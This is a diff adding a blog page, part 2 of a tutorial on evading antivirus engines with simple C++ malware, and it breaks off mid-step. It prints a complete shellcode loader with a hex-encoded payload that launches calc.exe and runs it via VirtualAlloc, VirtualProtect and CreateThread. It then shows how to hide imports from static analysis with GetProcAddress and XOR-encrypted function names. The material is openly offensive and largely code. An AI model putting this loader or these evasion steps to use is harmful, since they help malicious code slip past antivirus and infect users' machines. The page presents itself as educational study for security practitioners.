@@ -1,0 +1,996 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>AV engines evasion for C++ simple malware - part 2 - cocomelonc</title>
+<meta name="description" content="﷽">
+
+
+  <meta name="author" content="cocomelonc">
+  
+  <meta property="article:author" content="cocomelonc">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="cocomelonc">
+<meta property="og:title" content="AV engines evasion for C++ simple malware - part 2">
+<meta property="og:url" content="https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html">
+
+
+  <meta property="og:description" content="﷽">
+
+
+
+  <meta property="og:image" content="https://cocomelonc.github.io/assets/images/3/2021-09-16_10-57.png">
+
+
+
+  <meta name="twitter:site" content="@cocomelonc">
+  <meta name="twitter:title" content="AV engines evasion for C++ simple malware - part 2">
+  <meta name="twitter:description" content="﷽">
+  <meta name="twitter:url" content="https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://cocomelonc.github.io/assets/images/3/2021-09-16_10-57.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-09-06T04:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "cocomelonc",
+      "url": "https://cocomelonc.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="cocomelonc Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          cocomelonc
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">about</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://cocomelonc.github.io/">
+        <img src="/assets/images/cat.png" alt="cocomelonc" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://cocomelonc.github.io/" itemprop="url">cocomelonc</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>cybersec enthusiast. CTF player</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:cocomelonkz@gmail.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/cocomelonckz" rel="nofollow noopener noreferrer me"><i class="fab fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.hackthebox.eu/profile/293150" rel="nofollow noopener noreferrer me"><i class="far fa-flag" aria-hidden="true"></i><span class="label">HackTheBox</span></a></li>
+          
+        
+          
+            <li><a href="https://tryhackme.com/p/cocomelonc" rel="nofollow noopener noreferrer me"><i class="far fa-flag" aria-hidden="true"></i><span class="label">TryHackMe</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/cocomelonc/" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/" rel="nofollow noopener noreferrer me"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="AV engines evasion for C++ simple malware - part 2">
+    <meta itemprop="description" content="﷽">
+    <meta itemprop="datePublished" content="2021-09-06T04:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html" class="u-url" itemprop="url">AV engines evasion for C++ simple malware - part 2
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>﷽</p>
+
+<p>Hello, cybersecurity enthusiasts and white hackers!</p>
+
+<p><img src="/assets/images/3/2021-09-16_10-57.png" alt="AV evasion 2" class="img-responsive" /></p>
+
+<p>This is not a tutorial to make a malware, but a practical case for educational purpose only.</p>
+
+<p>This is the second part of the tutorial, firstly, I recommend that you study the <a href="/tutorial/2021/09/04/simple-malware-av-evasion.html">first</a> part.</p>
+
+<p>In this post we will study function call obfuscation.
+So what is this? Why malware developers and red teamers need to learn it?</p>
+
+<p>Let’s consider our <code class="language-plaintext highlighter-rouge">evil.exe</code> from part 1 in virustotal: <br />
+<a href="https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e9808efbfaf7989e1e15fd9587ca/detection">https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e9808efbfaf7989e1e15fd9587ca/detection</a></p>
+
+<p>and go to the details tab: <br />
+<img src="/assets/images/3/2021-09-06_16-02.png" alt="details" class="img-responsive" /></p>
+
+<p>Every PE module like <code class="language-plaintext highlighter-rouge">.exe</code> and <code class="language-plaintext highlighter-rouge">.dll</code> usually uses external functions. So when it is running, it will call every functions implemented in an external DLLs which will be mapped into a process memory to make this functions available to the process code.</p>
+
+<p>AV industry analyze most kind of external DLLs and functions are used by the malware. It can be a good indicator if this binary is malicious or not. So AV engine analyzes a PE file on disk by looking the into its import address.</p>
+
+<p>Of course this method is not bullet proof and can generate some false positives but it is a known to work in some cases and is widely used by AV engines.</p>
+
+<p>So what we as a malware developers can do about it? This is where function call obfuscation comes into play. <strong>Function Call Obfuscation</strong> is a method of hiding your DLLs and external functions that will be called a during runtime. To do that we can use standard Windows API functions called <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code>. The former returns a handled a specifiied DLL and later allows you to get a memory address of the function you need and which is exported from that DLL.</p>
+
+<p>So let me give you an example. So let’s say your program needs to call a function called <code class="language-plaintext highlighter-rouge">HackAndWin</code> which is exported in a DLL named <code class="language-plaintext highlighter-rouge">hacker.dll</code>. So first you call <code class="language-plaintext highlighter-rouge">GetModuleHandle</code>, and then you can call <code class="language-plaintext highlighter-rouge">GetProcAddress</code> with an argument of <code class="language-plaintext highlighter-rouge">HackAndWin</code> function and in return you get in address of that function:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hack</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"hacker.dll"</span><span class="p">),</span> <span class="s">"HackAndWin"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>So what is important here? Is that if you compile your code, compiler will not include <code class="language-plaintext highlighter-rouge">hacker.dll</code> into import address table. So AV engine will not be able to see that during static analysis.</p>
+
+<p>Let’s see how we can practically use this technique. Let’s take a look at the source coude of our first malware from <a href="http://127.0.0.1:4000/tutorial/2021/09/04/simple-malware-av-evasion.html">part 1</a>:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+cpp implementation malware example with calc.exe payload
+*/</span>
+<span class="cp">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="c1">// our payload calc.exe</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">my_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span>
+  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span>
+  <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span>
+  <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
+  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span>
+  <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
+  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span>
+  <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
+  <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span>
+  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
+  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span>
+  <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
+  <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span>
+  <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
+  <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x00</span>
+<span class="p">};</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">my_payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">my_payload</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span> <span class="n">my_payload_mem</span><span class="p">;</span> <span class="c1">// memory buffer for payload</span>
+  <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
+  <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
+  <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="c1">// Allocate a memory buffer for payload</span>
+  <span class="n">my_payload_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">my_payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+
+  <span class="c1">// copy payload to buffer</span>
+  <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">my_payload_mem</span><span class="p">,</span> <span class="n">my_payload</span><span class="p">,</span> <span class="n">my_payload_len</span><span class="p">);</span>
+
+  <span class="c1">// make new buffer as executable</span>
+  <span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">my_payload_mem</span><span class="p">,</span> <span class="n">my_payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+
+    <span class="c1">// run payload</span>
+    <span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">my_payload_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So this code contains very basic logic for executing payload. So in this case, for simplicity, it’s not encrypted payload, it’s plain payload.</p>
+
+<p><img src="/assets/images/3/2021-09-06_16-31.png" alt="payload" class="img-responsive" /></p>
+
+<p>Let’s compile it:  <br />
+<img src="/assets/images/3/2021-09-06_16-45.png" alt="compile" class="img-responsive" /></p>
+
+<p>and run to make sure that it works:  <br />
+<img src="/assets/images/3/2021-09-06_16-44.png" alt="run" class="img-responsive" /></p>
+
+<p>So let’s take a look into import address table.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-x</span> <span class="nt">-D</span> evil.exe | less
+</code></pre></div></div>
+<p><img src="/assets/images/3/2021-09-06_16-49.png" alt="objdump address table" class="img-responsive" /></p>
+
+<p>and as you can see our program is uses <code class="language-plaintext highlighter-rouge">KERNEL32.dll</code> and import all this functions:  <br />
+<img src="/assets/images/3/2021-09-06_16-51.png" alt="imported functions kernel32.dll" class="img-responsive" /></p>
+
+<p>and some of them are used in our code:  <br />
+<img src="/assets/images/3/2021-09-06_16-57.png" alt="imported functions kernel32.dll" class="img-responsive" /></p>
+
+<p>So let’s get read of <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>. So how we can do that?
+First of all we need to find a declaration <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:  <br />
+<img src="/assets/images/3/2021-09-06_17-01.png" alt="virtualalloc declaration" class="img-responsive" /></p>
+
+<p>and just a make sure that it is implemented in a <code class="language-plaintext highlighter-rouge">Kernel32.dll</code>:  <br />
+<img src="/assets/images/3/2021-09-06_17-04.png" alt="virtualalloc declaration" class="img-responsive" /></p>
+
+<p>So let’s create a global variable called <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, but it has to be a pointer <code class="language-plaintext highlighter-rouge">pVirtualAlloc</code> this variable will store the address to <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:  <br />
+<img src="/assets/images/3/2021-09-06_17-18.png" alt="pvirtualalloc" class="img-responsive" /></p>
+
+<p>And now we need to get this address via <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, and we need to change the call <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> to <code class="language-plaintext highlighter-rouge">pVirtualAlloc</code>:  <br />
+<img src="/assets/images/3/2021-09-06_17-25.png" alt="pvirtualalloc in code" class="img-responsive" /></p>
+
+<p>Then let’s go to compile it. And see again import address table:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-x</span> <span class="nt">-D</span> evil.exe | less
+</code></pre></div></div>
+<p><img src="/assets/images/3/2021-09-06_17-27.png" alt="pvirtualalloc import address table" class="img-responsive" /></p>
+
+<p>So no <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> in import address table.
+Looks good. But, there is a caveat. When we try to extract all the strings from the our binary we will see that <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> string is still there. Let’s do it.
+run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="nt">-n</span> 8 evil.exe
+</code></pre></div></div>
+<p><img src="/assets/images/3/2021-09-06_17-30.png" alt="strings evil" class="img-responsive" /></p>
+
+<p>as you can see it is here. The reason is that we are using the stream in cleartext when we are calling <code class="language-plaintext highlighter-rouge">GetProcAddress</code>.</p>
+
+<p>So what we can do about it? <br />
+The way is we can remove that. We can used XOR function for encrypt/decrypt, we used before, so let’s do that.
+Firstly, add XOR function to our <code class="language-plaintext highlighter-rouge">evil.cpp</code> malware source code:</p>
+
+<p><img src="/assets/images/3/2021-09-06_17-35.png" alt="add XOR" class="img-responsive" /></p>
+
+<p>For that we will need encryption key and some string. And let’s say string as <code class="language-plaintext highlighter-rouge">cVirtualAlloc</code> and modify our code:   <br />
+<img src="/assets/images/3/2021-09-07_01-09.png" alt="add key" class="img-responsive" /></p>
+
+<p>add XOR decryption:  <br />
